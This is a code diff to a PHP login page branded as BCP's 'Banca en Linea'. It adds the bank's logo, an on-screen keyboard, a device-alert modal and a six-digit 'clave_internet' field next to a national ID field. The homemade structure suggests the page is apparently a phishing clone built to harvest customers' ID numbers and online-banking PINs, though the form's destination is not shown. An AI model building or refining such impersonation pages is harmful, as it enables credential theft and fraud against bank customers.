@@ -12,12 +12,14 @@ if (isset($_GET["error"])) {
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login | Banca en Linea BCP</title>
     <link href="css/style_login.css" rel="stylesheet">
+    <link rel="shortcut icon" href="img/bcp_logo.png" type="image/x-icon">
+    <link rel="stylesheet" href="keyboard/keyborad.css">
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
 </head>
 
 <body>
     <main>
-        <!-- <?php // include 'modals/alerta_dispositivo.php' 
-        ?> -->
+        <?php include 'modals/alerta_dispositivo.php' ?>
         <div class="logo"><img src="img/loguito.png" alt="logo_bcp.jpg"></div>
         <div class="flex">
             <!--Cambiar image-->
@@ -34,8 +36,8 @@ if (isset($_GET["error"])) {
                         <input type="text" placeholder="Nº de Documento" name="dni" autocomplete="off">
                     </div>
                     <div>
-                        <input type="password" placeholder="Clave de internet de 6 digitos" name="pin"
-                            autocomplete="off">
+                        <input type="password" class="use-keyboard-input"  placeholder="Clave de internet de 6 dígitos" name="clave_internet"
+                            autocomplete="off" maxlength="6" id="digitos" required>
                     </div>
                     <?php if ($error != null): ?>
                         <p class="error"><?= $error ?></p>
@@ -45,7 +47,8 @@ if (isset($_GET["error"])) {
             </div>
         </div>
     </main>
-    <script src="js/"></script>
+    <script src="keyboard/keyboard.js"></script>
+    <script src="js/limite_clave_internet.js"></script>
 </body>
 
 </html>
